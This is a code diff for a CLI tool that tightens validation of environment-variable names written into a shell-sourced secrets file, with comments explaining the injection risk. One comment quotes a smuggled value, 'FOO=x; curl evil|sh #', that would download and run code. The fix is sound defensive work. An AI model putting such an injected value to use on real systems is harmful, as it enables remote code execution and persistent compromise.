@@ -35,24 +35,27 @@ function shellSingleQuote(value: string): string {
   return "'" + value.replace(/'/g, "'\\''") + "'";
 }
 
-// A POSIX `set -a` env-var name: a leading letter/underscore then letters,
-// digits, underscores. The writer and remover interpolate `name` into the
-// secrets.env line AND the matching regex, so a name carrying `=`, a newline,
-// or regex metacharacters could inject an extra `export …` line into a file the
-// gini wrapper shell-sources, or corrupt the match. Historically every caller
-// passed a fixed constant; this guard hardens the path now that a
-// user-configurable apiKeyEnv (e.g. AZURE_OPENAI_API_KEY) can reach here.
-const ENV_VAR_NAME_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;
-
-export function isValidEnvVarName(name: string): boolean {
-  return ENV_VAR_NAME_RE.test(name);
+// An env-var NAME is interpolated raw into the shell-sourced secrets.env line
+// AND into the match RegExps below, so it MUST be a strict identifier. A name
+// like `FOO=x; curl evil|sh #` or one bearing a newline would otherwise smuggle
+// arbitrary shell into a file the `gini` wrapper sources on every launch (RCE
+// persistence), and an unconstrained name is also a RegExp-injection / ReDoS
+// vector. Unlike the value (which `shellSingleQuote` neutralizes), the name has
+// no safe-quoting form in `export NAME=…`, so reject anything non-conforming.
+// This guard matters now that a user-configurable apiKeyEnv (a custom
+// ANTHROPIC/AZURE_OPENAI_API_KEY env name, etc.) can reach here.
+const SAFE_ENV_VAR_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;
+export function isSafeEnvVarName(name: string): boolean {
+  return SAFE_ENV_VAR_NAME.test(name);
 }
-
-function assertValidEnvName(name: string): void {
-  if (!isValidEnvVarName(name)) {
-    throw new Error(`Invalid environment variable name: ${JSON.stringify(name)}`);
+// Alias under the name the Azure-provider path on main imports.
+export const isValidEnvVarName = isSafeEnvVarName;
+function assertSafeEnvVarName(name: string): void {
+  if (!SAFE_ENV_VAR_NAME.test(name)) {
+    throw new Error(`Refusing to use unsafe env var name '${name}'; must match /^[A-Za-z_][A-Za-z0-9_]*$/.`);
   }
 }
+
 
 // Write a `KEY=value` (or replace an existing one) into ~/.gini/secrets.env
 // in a shell-sourceable form. Always lands at mode 0600 — even when the
@@ -67,7 +70,7 @@ function assertValidEnvName(name: string): void {
 // keeps that permission. Explicit chmod after the write ensures 0600 on
 // every call so secrets aren't world-readable.
 export function writeKeyToSecretsEnv(name: string, value: string): void {
-  assertValidEnvName(name);
+  assertSafeEnvVarName(name);
   const path = secretsEnvPath();
   // mkdir if missing — secrets.env may be the first file we ever write
   // here on a fresh install.
@@ -92,7 +95,9 @@ export function writeKeyToSecretsEnv(name: string, value: string): void {
 // log / nudge a plist refresh. Mode stays 0600 via the same chmod the
 // writer enforces.
 export function removeKeyFromSecretsEnv(name: string): boolean {
-  assertValidEnvName(name);
+  // An unsafe name can never have been written (writeKeyToSecretsEnv rejects
+  // it), so there's nothing to remove — and skipping avoids RegExp injection.
+  if (!isSafeEnvVarName(name)) return false;
   const path = secretsEnvPath();
   if (!existsSync(path)) return false;
   const existing = readFileSync(path, "utf8");
@@ -163,7 +168,7 @@ export function readSecretsEnvBody(): string | undefined {
 // so `gini setup` and `gini import apply openclaw` agree on what
 // counts as "the operator has configured this key."
 export function secretsEnvHasKey(name: string): boolean {
-  assertValidEnvName(name);
+  if (!isSafeEnvVarName(name)) return false;
   const path = secretsEnvPath();
   if (!existsSync(path)) return false;
   const contents = readFileSync(path, "utf8");
